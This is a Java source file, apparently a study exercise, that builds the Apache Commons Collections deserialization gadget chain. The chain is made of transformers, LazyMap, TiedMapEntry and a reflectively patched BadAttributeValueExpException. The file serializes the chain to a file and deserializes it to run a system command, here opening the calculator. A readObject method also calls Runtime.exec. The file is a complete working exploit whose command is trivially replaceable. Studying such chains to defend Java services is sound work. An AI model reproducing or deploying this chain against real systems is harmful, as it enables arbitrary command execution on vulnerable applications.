package day1.cc;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * 序列化漏洞
 *
 * @date 2023/11/11 11:40
 */

public class SerializationVulnerability {
    public static void main(String[] args) throws Exception{
    //构造利用链相关环的对象，最终目的达到命令行执行的效果（本例中弹出计算器应用）
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc"})};
    Transformer chain4Obj = new ChainedTransformer(transformers);
    LazyMap chain3Obj = (LazyMap) LazyMap.decorate(new HashMap(), chain4Obj);
    TiedMapEntry chain2Obj = new TiedMapEntry(chain3Obj, "anyKey");

    // 构造利用链的第一环BadAttributeValueExpException对象，因相关方法非public，使用反射强行设置val属性
    BadAttributeValueExpException chain1Obj = new BadAttributeValueExpException(null);
    Field valField = chain1Obj.getClass().getDeclaredField("val");
    valField.setAccessible(true);
    valField.set(chain1Obj, chain2Obj);

    // 使用jdk库函数将chain1Obj序列化到文件D:\hacker中
    ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream("D:\\hacker"));
    objOut.writeObject(chain1Obj);

    // 使用jdk库函数将文件D:\hacker内容反序列化为对象，反序列化漏洞触发任意命令行执行
    ObjectInputStream objIn = new ObjectInputStream(new FileInputStream("D:\\hacker"));
    Object object = objIn.readObject();
    }
    private void readObject(ObjectInputStream s)throws java.io.IOException, ClassNotFoundException{
        s.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
    }

}
